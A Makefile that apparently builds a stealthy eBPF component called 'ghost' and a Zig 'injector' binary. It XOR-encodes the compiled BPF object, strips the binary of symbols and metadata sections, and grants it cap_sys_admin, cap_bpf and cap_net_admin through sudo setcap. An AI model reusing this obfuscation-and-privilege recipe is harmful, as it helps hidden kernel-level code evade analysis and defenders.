CC = clang
ZIG = zig
BPF_OBJ = target/ghost.o
FINAL = target/zt

all: clean bpf injector finalize

bpf:
	mkdir -p target
	$(CC) -O3 -target bpf -g0 -c src/bpf/ghost.c -o $(BPF_OBJ)
	python3 -c "d=open('$(BPF_OBJ)','rb').read();open('$(BPF_OBJ)','wb').write(bytearray([b^0x7A for b in d]))"

injector:
	$(ZIG) build-exe src/main.zig \
		-target x86_64-linux-musl \
		-O ReleaseSmall \
		--strip \
		-fno-compiler-rt \
		-fno-stack-check \
		--name $(FINAL)

finalize:
	strip --strip-all --remove-section=.comment --remove-section=.note $(FINAL)
	sudo setcap cap_sys_admin,cap_bpf,cap_net_admin+ep $(FINAL)

clean:
	rm -rf target
